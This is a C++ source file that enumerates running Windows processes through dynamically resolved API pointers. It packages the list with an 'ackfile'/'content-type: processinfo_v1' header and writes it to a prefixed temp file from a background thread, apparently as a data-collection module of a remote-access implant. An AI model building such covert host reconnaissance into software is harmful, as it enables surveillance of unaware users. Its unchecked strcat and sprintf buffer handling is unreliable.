// getprocessinfo.cpp: implementation of the getprocessinfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "getprocessinfo.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

int EnumProcess(char* buf)
{
	char Utf8Buf[2000];
	WCHAR UniBuf[1000];
	int retlen = 0, buflen;
	HANDLE hSnapshot;

	hSnapshot = PCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32W pe;

	pe.dwSize = sizeof(PROCESSENTRY32W);

	PProcess32FirstW(hSnapshot, &pe);

	int count = 0;
	do
	{
		WCHAR wszCmdLine[MAX_PATH], wszCurDir[MAX_PATH];
		memset(wszCmdLine, 0, sizeof(wszCmdLine));
		memset(wszCurDir, 0, sizeof(wszCurDir));

		if (pe.th32ProcessID != 0)
		{
			swprintf(UniBuf, L"%d\t%s\t%d\t%s\t\t%s\t\t\n", count, pe.szExeFile, pe.th32ProcessID, wszCmdLine, wszCurDir);

			buflen = Unicode2UTF_8(UniBuf, Utf8Buf, 2000);
			
			strcat(buf, Utf8Buf);
			retlen += buflen-1;
			count++;
		}
	}
	while (PProcess32NextW(hSnapshot, &pe));
	
	CloseHandle(hSnapshot);

	memset(Utf8Buf, 0, 32);
	retlen += sprintf(Utf8Buf, "%d", count);
	strcat(buf, Utf8Buf);

	return retlen;
}

DWORD WINAPI GetProcess(LPVOID lp)
{
	char *p=0;//目录名
	char tmpbuf[1024];
	//取补丁信息
	/*		char *UpdateInfo;*/
	char* SendBuf;
	int offset = 1024;
	
	SendBuf = new char[102400];
	ZeroMemory(SendBuf,102400);
	
	int tmp = EnumProcess(SendBuf+offset);
	offset+=tmp;
	
	// 生成描述信息
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	
	char processfilename[MAX_PATH];
	char processfilea[MAX_PATH];
	char FixDir[10];
	strcpy(FixDir, GetTmpPrevFix(FIX_SYSTEMINFO));
	CreateFileName(FixDir, processfilename, processfilea);		// 得到目标文件名
	
	int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: processinfo_v1\r\n\r\n",
		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
		nowtime.wHour, nowtime.wMinute, nowtime.wSecond, processfilea, offset-1024);//processinfo 2018 05
	
	int datalen = offset-1024 + len;
	memcpy(SendBuf+1024-len, tmpbuf, len);
	
	char *pBuffer = new char[datalen+10];
	memset(pBuffer, 0, datalen+10);
	memcpy(pBuffer, SendBuf+1024-len, datalen);
	
	myWriteFile(pBuffer, datalen, processfilename, processfilea);
	
	if (SendBuf)
	{
		delete []SendBuf;
	}

	if (pBuffer)
	{
		delete[] pBuffer;
	}

	return 0;
}

DWORD ThreadGetProcessInfo(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		GetProcess, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}